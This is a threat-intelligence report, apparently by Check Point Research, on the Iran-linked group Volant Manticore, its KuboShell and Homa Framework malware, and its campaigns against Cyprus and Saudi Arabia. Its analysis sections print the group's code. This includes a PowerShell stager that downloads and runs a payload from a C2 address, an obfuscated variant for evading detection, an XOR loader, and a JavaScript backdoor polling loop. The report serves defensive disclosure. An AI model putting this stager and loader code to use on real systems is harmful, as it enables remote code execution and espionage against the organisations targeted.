## Introduction

Check Point Research is tracking a previously undocumented Iran-nexus threat group who we named **Volant Manticore**. What started in July 2026 as a single backdoor delivered to a Cyprus-based airline through a fake CV has since expanded into a broader cluster of activity that we traced back to September 2025.

MuddyWater is an Iranian espionage group [linked to the Ministry of Intelligence and Security (MOIS)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-055a), focusing primarily on espionage and active since at least 2017. Volant Manticore shares tooling and tradecraft with MuddyWater, but their narrow regional focus, custom implants, and distinct TTPs (Tactics, Techniques, and Procedures) set it apart.

**Cyprus is at the center of Volant Manticore’s operations.** The island’s deepening defensive and energy ties with Israel and Greece, and its role as a hub for Western military operations in the region, make it a natural target for Iranian intelligence collection. Cyprus was among the countries where we [observed a rise](https://research.checkpoint.com/2026/interplay-between-iranian-targeting-of-ip-cameras-and-physical-warfare-in-the-middle-east/) in Iran-nexus targeting of IP cameras starting February 28, 2026, activity that may precede military strikes as well as support post-battle damage assessment. The group’s focus on the island’s telecommunications companies and airlines is consistent with Iran’s [history](https://www.gov.il/en/pages/iranian-terror-plot-in-cyprus-thwarted-10-dec-2023) of operational activity against individuals in Cyprus.

In September 2026, coinciding with escalating hostilities between Saudi Arabia and the Iranian-backed Houthis, we observed Volant Manticore **abruptly shifting their attention to Saudi Arabia** and targeting healthcare organizations. This fits the MOIS’s [track](https://www.ynetnews.com/tech-and-digital/article/rki5j78cxe) record of targeting hospitals and healthcare providers through cyber operations during military conflicts, in some cases attempting to disrupt their operations.

In this report, we analyze the KuboShell backdoor and the Homa Framework, map Volant Manticore’s wider infrastructure, and analyze an earlier campaign against a likely Cypriot government target. We also cover the group’s recent turn toward Saudi Arabia and present evidence for our attribution.

### KuboShell – IPFS as a Command-and-Control Channel

KuboShell is a 64-bit Windows backdoor that uses the InterPlanetary File System (IPFS) for command-and-control (C2) communication. IPFS is a peer-to-peer file-sharing network that identifies each file by its content hash instead of its location. Because files remain available only while some node stores(“pins”) them, KuboShell relies on Pinata, a commercial pinning service that provides an API for uploading and retrieving files on IPFS. Kubo, referenced in the backdoor’s PDB path, is the original implementation of IPFS.

On startup, KuboShell checks whether it has administrator privileges. If not, it tries to relaunch itself with higher privileges, which triggers a User Account Control (UAC) prompt.

KuboShell retrieves the MAC address of the machine’s first network adapter and uses it as a unique identifier for each victim. It then registers the host by uploading a file containing hi, saved to C:\\Users\\Public\\<MAC>.log, using a hard-coded Pinata access token.

After it’s registered, KuboShell checks Pinata for a command file named <MAC>.txt. If this file exists, KuboShell looks up the file’s IPFS identifier and downloads its contents through Pinata’s public gateway.

The downloaded text is passed to PowerShell in a hidden window. After execution completes, KuboShell attempts to upload C:\\Users\\Public\\<MAC>re.txt, where the command is expected to write its results. KuboShell does not capture the output itself, so results are returned only if the received command writes them to that file. KuboShell then checks for a new command every 60 seconds.

## Whacking the Piñata

We analyzed the historical commands issued by the operator and the command output across a time period spanning from May to October 2026, including operator testing conducted during the two months before the first observed phishing attempt.

Based on the operator commands, KuboShell appears to serve as an initial foothold for executing basic reconnaissance commands, particularly quser, whoami, and ipconfig, before downloading and executing a more capable backdoor through a multi-stage PowerShell and JavaScript execution chain. KuboShell therefore appears to function as a “guardrail”, allowing the operators to assess the compromised environment before deploying the final payload, consistent with phishing-based initial access.

### Right Commands, Wrong Console

The operators sent list, persist, and payload commands to KuboShell, though none of them is a valid PowerShell command. These apparent “mistakes” suggest the operators entered built-in framework commands into the wrong console, which is consistent with the theory that the operators used a modular framework layered on top of the relatively simple JavaScript backdoor that acts as the final stage of this infection chain. As we discuss later in this section, the JavaScript backdoor exhibits links to MuddyWater tooling. Notably, all three commands sent by the operators are known commands in MuddyWater’s dedicated C2 frameworks, such as [PhonyC2](https://www.deepinstinct.com/blog/phonyc2-revealing-a-new-malicious-command-control-framework-by-muddywater). This further supports the idea that the backdoor functions as the core module executor within a broader framework – which Check Point Research tracks as the Homa Framework.

### Stage 1 – PowerShell Stager

The first stage is a simple PowerShell command that requests a payload from a hard-coded IP address, 185.205.187\[.\]109:8000, using a unique URI path assigned to each new client. It then reads the response and executes it in memory.

```powershell
$uri ="http://185.205.187[.]109:8000/{UID}";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop; Invoke-Expression $response.Content
```

To bypass static analysis and evade signature-based detection, the operators appear to have experimented with different techniques to hide command execution, such as extracting character slices from system paths or default PowerShell preference variables like SpecialFolders\[‘AllUsersStartUp’\]and $PSSessionConfigurationName, to dynamically build execution triggers such as iex.

```ruby
$uri ="http://"+"185"+"."+"205"+"."+"187"+"."+"109"+":8000/{UID}";$req = [System.Net.WebRequest]::Create($uri);$rgr = '$re' + 'q.GetRe' + 'sponse()';$res = .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $rgr;$rger = '$res.GetR' + 'espon' + 'seStream()'; $strm = .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $rger ;$reader = New-Object System.IO.StreamReader($strm);$content = $reader.ReadToEnd(); .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $content 
```

### Stage 2 – PowerShell Loader

The second stage PowerShell script decodes an encoded string using a defined Xor-Decode function. It removes newline characters and processes the input in three-character numeric chunks. The resulting value is passed to Add-Type with the JavaScript language option, after which the script attempts to invoke a static run() method. A while($true) loop repeatedly executes this logic, with exception handling that retries compilation under an alternative type name.

```powershell
function Xor-Decode {
    param ([string]$EncodedText)

    $key = [int][char]'o'
    $result = ""

    $clean = ($EncodedText -replace "`r|`n", "")

    for ($i = 0; $i -lt $clean.Length; $i += 3) {
        $num = [int]$clean.Substring($i, 3)
        $result += [char]($num -bxor $key)
    }

    return $result
}

$src = "079079079079028027014027006012..."

$dec = Xor-Decode $src
while($true) {
    try {
        $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc35')[1]
        $jsc::run()
    }
    catch {
        $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc36')[1]
        $jsc::run()
    }
}
```

### Stage 3 – JavaScript Backdoor

The backdoor implements a continuous C2 loop. It sends an initial hi message to hxxp://185.205.187\[.\]109:8000/X{key}, where key is a five-character alphanumeric hard-coded identifier populated per victim to act as a unique identifier. It communicates using the WinHttp.WinHttpRequest.5.1 COM object, which the server-side component checks for its default User-Agent string when handling incoming requests. The server’s response is interpreted as a command.

```javascript
static function httppost(content, key) {
	   try
	   {
			var objHTTP = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
			var url = "http://185.205.187[.]109:8000/X" + key;
			var data = content + "()" + key;
			objHTTP.Open("POST", url, false);
			objHTTP.Send(data);
			var res = objHTTP.responseText;
			res = res.slice(1, -1);

			return res;
	   }
	   ...
}

static function run() {
		...        
	  while(true) 
	  {
			...
			  var cmd = httppost("hi", key);
			  if (cmd.length > 2) {
			      result = ex(cmd);
			  }
			...
				if(result.length > 2) {
			      result = httppost(result, key); 
        }
        sleep();
		}
}
```

The backdoor executes received commands according to their prefix:

-   PowerShell commands: Commands beginning with function are executed through hidden PowerShell with execution-policy bypass.
-   SSH commands: Commands beginning with ssh are launched asynchronously through cmd.exe, likely so that long-running SSH sessions, such as tunnels, won’t block the polling loop.
-   Other commands: Executed through cmd.exe /c, with standard output redirected to C:\\Users\\Public\\outputt2.txt.

The backdoor reads the command output from the temporary file, strips non-printable characters and blank lines, and then deletes the file. Any output that’s produced is sent back to the C2 server using an HTTP POST request. The loop pauses for ten seconds between iterations.

We assess that the third-stage backdoor is designed, at least in part, to execute additional modules which we were unable to recover.

#### Code Similarities with MuddyWater

The Homa Framework’s third-stage payload closely resembles MuddyWater’s [MuddyC2Go](https://www.deepinstinct.com/blog/muddyc2go-latest-c2-framework-used-by-iranian-apt-muddywater-spotted-in-israel) framework:

-   The same payload-delivery URI pattern: H followed by a 32 alphanumeric characters identifier
-   The same POST request format:

### Operator Testing and Operational Environments

Volant Manticore operators tested KuboShell on their own machines, partially exposing their testing and development environments. MAC address prefixes and network adapter details indicate the use of both VirtualBox and VMware guests. Several VMware guests shared both a NAT subnet and a gateway. As VMware assigns this subnet per installation, these guests were likely running on the same host. Overall, we identified at least two distinct VMware environments in addition to the VirtualBox environment.

Taken together, the evidence suggests that at least two operators were engaging with the same Pinata account. One, whom we assess to be KuboShell’s developer, used a VirtualBox environment. The other operator primarily used VMware environments and appears to have been more directly involved in carrying out the campaign, including testing ahead of operational activity.

Some of these VMs also had VPN-related virtual adapters installed:

-   Multiple VMs with Fortinet SSL VPN.
-   An IVPN adapter on a VirtualBox guest that also had Fortinet adapters.
-   A VPN adapter associated with Kaspersky on a VMware guest.

The use of the IVPN adapter, a commercial privacy VPN, alongside a Fortinet adapter suggests that the VM might also be used operationally in addition to testing. The Fortinet adapters could indicate that the operators use enterprise VPN connections to access victim environments.

Like IVPN, the Kaspersky antivirus adapter can also provide a privacy VPN. However, because this VPN component can be bundled with the antivirus software, we consider it more likely that it reflects an antivirus installation on a machine used to test tooling against that product.

In addition, we identified a separate cluster of VMs with Azure-associated configuration that may also represent actor-controlled testing infrastructure. Within the command history, explicit Active Directory discovery commands were limited to this cluster. We suspect Volant Manticore used these VMs to test AD-related functionality in a prepared environment.

## January 2026: Military-Themed Lure Likely Targeting a Cypriot Government Entity

The observed Homa Framework C2 was 185.205.187\[.\]109, but the operator commands revealed the actor also used 185.205.187\[.\]107 in August. This suggests several adjacent addresses were provisioned together. The “missing” address in the series, 185.205.187\[.\]108, led us to an earlier campaign.

In January 2026, a malicious Word document named MilitaryHeritageProposal.doc was uploaded to VirusTotal from Cyprus. It shows a blurred page and asks the reader to enable content to see it. We assess the phishing attempt was likely aimed at a Cypriot government entity. The military theme may indicate the target is related to the defense sector.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bf969aac14c89ca3.png)

Figure 6 – The MilitaryHeritageProposal.doc lure.

The document hides a VBA backdoor in its macros. Enabling the content triggers execution through one of two paths: one fires shortly after a fake “Microsoft Word is not responding” error message is shown, and the other one fires if the victim closes the document in response. Ahead of running the second stage, the macros set HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\AccessVBOM to 1, granting programmatic access to the VBA project. It then opens a hidden Word instance, rebuilds the second-stage code from hundreds of encoded fragments, and injects it into that instance.

After the second stage runs, every other WINWORD.EXE process, including the one hosting the original document, is terminated. To the victim, Word simply appears to have crashed, and only the hidden instance survives. The backdoor then generates a random 10-character victim ID and registers with the C2 at 185.205.187\[.\]108:25498 over plain HTTP. From there it loops: check for a file to download, wait 20 seconds, poll for a command, wait another 20 seconds.

|     |     |     |     |
| --- | --- | --- | --- |
| Endpoint | **Decoded** | **JSON Body** | **Purpose** |
| /c2lnbnVw | signup | {“id”, “local_ip”, “public_ip”} | Victim registration |
| /dXBkYXRl | update | {“victim_id”} | Command retrieval |
| /cmVzdWx0 | result | {“id”, “result”} | Command result submission |
| /Claws?fragment=N | –   | {“id”} | Fragmented file download to C:\\Users\\Public\\ |

The backdoor handles each command by its prefix:

-   Commands that start with $uri or $req run through hidden PowerShell. **These same variables were present in the Homa Framework first-stagers we observed earlier.** This branch therefore appears to exist specifically to deliver follow-up payloads, possibly related to Homa. Two more clues support this:
    -   Unlike the cmd.exe path, the PowerShell branch does not send its output back to the C2.
    -   The VBA backdoor has no persistence mechanism of its own.
-   Other commands run through cmd /c, with output captured to C:\\ProgramData\\UiAutomation.txt, read back, deleted, and sent to the C2 as a JSON-formatted result.

Downloaded files arrive in sequential fragments, which the backdoor reassembles and saves to C:\\Users\\Public under a filename the C2 supplies in the X-Filename HTTP response header.

## Eyes on the Kingdom: Shifting Focus Towards Saudi Arabia

Volant Manticore began targeting Saudi entities in September 2026. In contrast to their earlier, narrowly targeted campaigns in Cyprus, we observed a sudden spike in the group’s phishing activity against Saudi organizations, with a seeming focus on the healthcare sector. **We assess that this shift may indicate that the operators were tasked, with short notice, to rapidly gain access to Saudi targets**:

-   **Spray-and-pray** – Phishing activity delivering NetLock RMM increased significantly, and its targeting appears to have broadened within Saudi Arabia. Several samples used generic lure names such as “WhatsApp Images” or “Excel Online”, suggesting a wider pool of recipients rather than specific organizations. Other samples retained Saudi-themed names, such as Madinati-Platform.exe and برنامج الاعتماد المشترك في السياحة العلاجية.exe (“Joint Accreditation Program in Medical Tourism”). As mentioned above, in one case Volant Manticore appears to have sent the same target two similar phishing lures in quick succession, one delivering KuboShell and the other N-able RMM, which may be an effort to gain a foothold by any means.
-   **Rushed development** – The KuboShell sample targeting Saudi Arabia contained leftover debug strings absent from the previously observed sample, suggesting it was compiled and deployed in a hurry.
-   **Repurposed infrastructure** – The group used the overtly Cyprus-themed domain cnpcyprus\[.\]net as C2 for NetLock RMM samples used against Saudi targets. This is consistent with a rapid shift in targeting before the dedicated infrastructure was in place.
-   **Geo-matched hosting** – Even though they didn’t register a new domain, on October 11, Volant Manticore re-routed the existing domain to a newly provisioned Saudi-based HostZealot VPS at 185.253.118\[.\]221. This is consistent with the group’s observed pattern of using victim-facing C2 infrastructure within the targeted country, and further strengthens our hypothesis that, while Volant Manticore intended to rotate old infrastructure, they simply didn’t manage to do so in time. While configuring the new VPS, the operators also exposed an open directory at its root – an apparent operational security (OPSEC) slip that may reflect hurried deployment.

One possible explanation for this apparent shift in targeting priorities is the escalating conflict involving Saudi Arabia and the Iranian-backed Houthis. The departure from the group’s earlier tailored spear-phishing supports two possible explanations. Volant Manticore’s handlers may have prioritized gaining access to a broader set of Saudi organizations over selectively targeting specific entities, or the operators were pushing hard to compromise these targets and sent them multiple lures within a short period, or both. ## Conclusion

**Volant Manticore shows how Iran’s cyber ecosystem continues to reshape itself.** What appears to be a group of former MuddyWater operators now operates independently, pairing legacy MuddyWater tooling with new implants of their own while pursuing a regional focus that has until now drawn little attention.

**Distinguishing Volant Manticore from MuddyWater is crucial.** While the two groups currently share part of their tradecraft, we expect Volant Manticore to keep developing its own tooling and TTPs, and the differences between the two groups will become more pronounced over time. **Treating Volant Manticore as part of MuddyWater could therefore lead to blind spots**, particularly for organizations in Saudi Arabia and Cyprus.

Cyprus appeared to be Volant Manticore’s primary focus, which makes sense considering the island’s increasing alignment with Iran’s adversaries. In September 2026, however, this pattern changed abruptly. As the conflict between Saudi Arabia and the Houthis escalated, Volant Manticore pivoted to an intensified campaign against Saudi organizations before its tooling and infrastructure were fully ready.

**We believe Volant Manticore will continue operating against Saudi Arabia as long as the conflict with the Houthis keeps escalating.** Meanwhile, **Cyprus will likely still remain a consistent target.** More broadly, we expect Volant Manticore to remain responsive to geopolitical developments, potentially shifting its targeting priorities in the event of major changes in the regional situation.

## Appendix 1 – Distinct Actors, Shared Roots?

Given our assessment that Volant Manticore is composed of former MuddyWater operators, we want to be transparent about our reasoning that led us to this conclusion. Considering the observed overlaps and the fluid nature of Iran’s threat landscape, we weighed several competing hypotheses:

-   **Same actor** – Volant Manticore and MuddyWater are the same group, or Volant Manticore is a subgroup operating within MuddyWater under specific tasking.
-   **Spin-off** – Volant Manticore comprises former MuddyWater operators who left individually or branched off together as a subgroup.
-   **Professional ties** – Operators of the two groups maintain formal or informal professional relationships.
-   **Shared training** – Operators of both groups share a common training background.
-   **Shared developer** – Both groups rely on a common developer, either an individual or a digital quartermaster.
-   **Copycat** – Volant Manticore imitates MuddyWater tooling and TTPs to create the appearance of an Iranian nexus.

#### Weighing the Alternatives

Volant Manticore relies on an older MuddyWater C2 framework, which MuddyWater has since replaced. A subgroup operating within MuddyWater would most likely have access to the group’s current tooling, making the **same-actor** hypothesis less likely. Similarly, a **copycat** would most likely imitate MuddyWater’s latest documented tooling, not a retired framework. Volant Manticore’s new custom implants, which serve as “guardrails” for Homa, make this scenario even less likely.

A **shared developer** could explain the tooling overlaps, but not the operational ones. While such a developer would likely have access to newer frameworks, Homa reimplements the older MuddyC2Go client and keeps its C2 protocol unchanged. This was likely done to evade existing detections with minimal development effort, leaving the server-side component untouched. Combined with our assessment that KuboShell was built by a single developer, this points to a small group with limited development resources, unlike the developers behind MuddyWater’s frameworks who replaced their tooling over time, most notably after public disclosures.

As for **professional ties** and **shared training**, key MuddyWater figures were [previously linked](https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/muddy-advanced-persistent-teacher.html) to Ravin Academy, described as a [talent pipeline for MOIS](https://home.treasury.gov/news/press-releases/jy1048). Such ties could result in both a common training background and professional relationships between otherwise distinct groups. In fact, MuddyWater’s TTPs have previously overlapped with those of other Iranian actors. Most recently, [Proofpoint](https://www.proofpoint.com/us/blog/threat-insight/crossed-wires-case-study-iranian-espionage-and-attribution) identified shared TTPs between TA450 (MuddyWater) and UNK_SmudgedSerpent, which Check Point tracks as Nimbus Manticore.

However, both explanations seem less likely in our case. If shared training through Ravin explained the overlaps, we would expect the tooling and TTPs Volant Manticore shares with MuddyWater to be common across Iranian groups. In our observation, they are primarily associated with MuddyWater. As for professional ties, they could explain the UNK_SmudgedSerpent overlaps, which may reflect a one-off collaboration. Volant Manticore, by contrast, has relied on MuddyWater tooling and TTPs consistently over time. This consistency is better explained by habits formed over years of operating within MuddyWater than by occasional collaboration between two separate threat actors. We also observed no signs of operational cooperation that would indicate ongoing contact, such as common targeting or hand-offs.

#### Why We Favor the Spin-off Hypothesis

-   **Legacy tradecraft** – Volant Manticore relies on an older MuddyWater framework and exhibits old MuddyWater TTPs. Both point to a close relationship with the group in the past. If that relationship continued, we would’ve expected the operators to have access to MuddyWater’s newer tooling. Instead, they reimplemented a framework they likely obtained while still part of the group.
-   **Gradual divergence** – Over time, Volant Manticore has moved beyond this legacy tradecraft. It built its own tooling and adapted its TTPs, adding methods such as credential-harvesting campaigns that set it apart from MuddyWater operations. This progression fits a group that started out relying on MuddyWater’s playbook and is gradually forming an identity of its own.
-   **Distinct targeting** – Volant Manticore’s persistent focus on Cyprus does not match MuddyWater’s targeting patterns. MuddyWater has occasionally targeted Cypriot entities, but its operations typically span multiple countries and shift over time. While Volant Manticore was targeting Cyprus, MuddyWater’s campaigns focused on other regions. This sustained single-country focus suggests Volant Manticore pursues its own goals and priorities.
-   **Separate infrastructure** – Volant Manticore relies on hosting providers and registrars that are not typically used by MuddyWater. It also appears to manage a smaller infrastructure footprint at any given time, which is more consistent with a small team.

**Considering all of the above, we assess with medium confidence that Volant Manticore is a separate, independent group composed of former MuddyWater operators who left either individually or as a group. These operators may retain ties to current MuddyWater members, but we assess that the observed overlaps primarily reflect their shared operational history rather than ongoing collaboration.**

#### Tracing the Split

If MuddyC2Go is the latest MuddyWater framework Volant Manticore’s operators had access to, **the split may have happened around 2023** as MuddyWater replaced MuddyC2Go with DarkBeatC2 in late 2023. We could only trace Volant Manticore’s infrastructure back to 2025, which leaves a visibility gap in between.

In addition to tooling, **Volant Manticore’s operators may have appropriated MuddyWater’s work environment.** The username pc, which appears in the lure document’s metadata, was previously associated with MuddyWater’s [phishing activity](https://lab52.io/blog/muddywaters-light-first-stager-targetting-middle-east/) and [malware development](https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/). While generic usernames usually carry limited weight on their own, we found the same username across several of Volant Manticore’s VMs. One possible explanation is that the operators are reusing VM images previously used by MuddyWater.
